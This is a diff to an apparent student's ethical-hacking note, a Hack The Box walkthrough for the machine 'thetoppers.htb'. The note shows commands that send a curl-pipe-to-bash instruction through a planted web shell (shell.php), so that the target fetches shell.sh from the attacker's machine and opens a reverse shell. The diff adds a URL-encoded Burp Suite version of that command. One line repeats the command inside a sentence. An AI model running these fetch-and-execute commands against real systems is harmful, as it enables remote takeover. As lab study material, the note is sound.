@@ -86,6 +86,12 @@ or with the terminal
 ```bash
 curl -G "http://thetoppers.htb/shell.php" \ --data-urlencode "cmd=curl http://YOUR_TUN0_IP:8000/shell.sh | bash"
 ```
+
+or in the [[Burp Suite]]:
+```bash
+curl%20<YOUR_IP_HERE>:<PORT>/shell.sh|bash
+```
+
 This tells the target to: download shell.sh from your machine → pipe it to bash → execute it.curl -G "http://thetoppers.htb/shell.php" \ --data-urlencode "cmd=curl http://YOUR_TUN0_IP:8000/shell.sh | bash"
 See [[Obsidian-University/University/Magistrale/Ethical Hacking/For Passion/Hacking Linux/Reverse Shells#What that full url means|here]] for details
 ### 6. You receive the shell
